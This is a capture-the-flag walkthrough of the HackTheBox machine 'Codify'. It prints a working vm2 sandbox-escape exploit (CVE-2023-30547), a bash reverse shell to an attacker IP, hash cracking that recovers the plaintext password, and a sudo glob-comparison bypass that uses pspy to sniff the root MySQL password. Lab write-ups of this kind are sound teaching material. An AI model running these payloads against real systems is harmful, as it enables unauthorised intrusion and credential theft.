
Starting with the IP address I proceed with a Nmap scan to uncover the open ports of the machine
```bash
nmap -sV -sC 10.129.38.126
```
![[Pasted image 20260730140835.png]]
- The scan shows that there are 3 ports open for the target:
	- port 22 holding ssh
	- port 80 open for http holding a website
	- port 3000 open for http holding a Node.js Express Framework

The scan also show that there is a domain name registered on the IP `codify.htb` so I need to add it to `/etc/hosts`
```bash
echo "10.129.38.126 codify.htb" | sudo tee -a /etc/hosts
```

### Website

Checking the website I learn that it allows anyone to test a Node.js code in a sandbox environment
![[Pasted image 20260730142239.png]]
- Clicking the `Try it now`  button it leads me to a code editor that allows a running node.js code
![[Pasted image 20260730142946.png]]

Also checking the `About us` page I learn that the website uses the `vm2` library for sandboxing JavaScript, so it means that all the code runs through a `vm2` sandbox environment
![[Pasted image 20260730143447.png]]

Clicking the `vm2` text it redirects to a github page that shows me the `3.9.16`version for the library
![[Pasted image 20260730143702.png]]

With a quick search on Google I found that the version for the `vm2` library is vulnerable to the [CVE-2023-30547](https://nvd.nist.gov/vuln/detail/cve-2023-30547) which leads to remote code execution

Also I found a PoC here: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244 

Following the PoC, I have to pass the following code and in the `execSync()` function right at the end I can provide the command that will be run on the system:
```js
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('<input_command_here>');
}
```

Checking if the script works I pass the command `id` and it returns with the id of the `svc` user:![[Pasted image 20260730145406.png]]

So now all I have to do is to pass a code that will give me a reverse shell on the target:
```bash
/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.16.53/4444 0>&1\'
```
- I used `\'` instead of a simple quote because I don't want to be interpreted as part of the JavaScript code 
![[Pasted image 20260730145644.png]]
- I started a listener with netcat: `nc -lvnp 4444` and it gave me access to the target
![[Pasted image 20260730145717.png]]

### Foothold 

The `svc` user is placed in the `/home` directory but it does not contain anything useful so I surely have to find another user:
- Checking the `/home` directory shows another user `joshua` which is the next target
![[Pasted image 20260730145931.png]]

Now that I have a new target I need to find a way to gain access to that account either by exploiting something or by finding the account's password

One way to search for a password is to find a database present either on a service or in a file and to do that I can use the `find` command
```bash
find / -name "*.db" -type f -readable 2>/dev/null
```
![[Pasted image 20260730150343.png]]
- The output shows 4 database files related to some libraries but the first result is located at `/var/www/contact/tickets.db` which is an unusual place and it may leak some credentials 

Reading the file I got exactly what I wanted: a password hash for the `joshua` user
![[Pasted image 20260730150618.png]]
- now what is left is to crack the hash using `hashcat` 

- First I put the hash into a file:
```bash
echo '<found_hash>' > hash
```
- Then I use `hashcat` on mode `3200` since this is a `bcrypt hash`
```bash
hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt --show
```
- The cracked password being `spongebob1`:
![[Pasted image 20260730150924.png]]

Using the credentials from below I attempted to connect through `ssh`, being a success and the user `joshua` was holding the user flag as I suspected
- username: `joshua`
- password: `spongebob1`
![[Pasted image 20260730151153.png]]

# System Flag

Next on the list is to retrieve the system flag, but I have to find a way inside the `root` account

It was not very hard to find a way, because when the command `sudo -l` showed me that there is a script found at `/opt/scripts/mysql-backup.sh` that can be run with `root` permissions
![[Pasted image 20260730152439.png]]

The script is used to backup a mysql database inside a backup directory using the mysql `root` account
```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

One particular thing about the script is how the mysql password of the `root` account is passed
- Instead of it being passed as an argument it is read from the console at the beginning of the script and only then it is checked against the real password
- The check `[[ $DB_PASS == $USER_PASS ]]` can be bypassed by using the `*` character; 
- If we input the character "`*`" for the USER_PASS then I will be able to pass the password check and it will led to the execution of the script

But to gain actually something from this script, I observed that later the script calls the `mysqldump` where as an argument the actual password DB_PASS is being passed so with a tool like `pspy` we can sniff the command and get the actual password of the `root` mysql account 

So to prove that this works I ran the script and used for the MySQL password for root the value: `*` and the script executed successfully
![[Pasted image 20260730164517.png]]
- There was even a message from the `mysqldump` command which advise me to not use a password on the command line interface, proving that my theory to sniff the password with `pspy` must be correct

Now I start a new ssh connection to the `joshua` user and transfer the `pspy` tool onto the target machine using a python web server
```bash
python3 -m http.server 80
```
- Then on the target I used `wget` to download the script
```bash
wget http://10.10.16.53/pspy64
```
- Then I gave execution permissions and ran the script
```bash
chmod +x ./pspy64 && ./pspy64
```
- The I ran from the other session the script and the password was shown inside the terminal running the `pspy64` tool
```bash
sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *
```
![[Pasted image 20260730165255.png]]
- Everything worked and I got a hold on the root MySQL password:
	- `kljh12k3jhaskjh12kjh3`

Having this password a good check is to see if I can ssh into the root account but it failed as it denied my entry

Another good check before trying something else is to if I can use `su root` with the found password
- Thankfully worked, giving me full access and allowing me to find the system flag
![[Pasted image 20260730165800.png]]

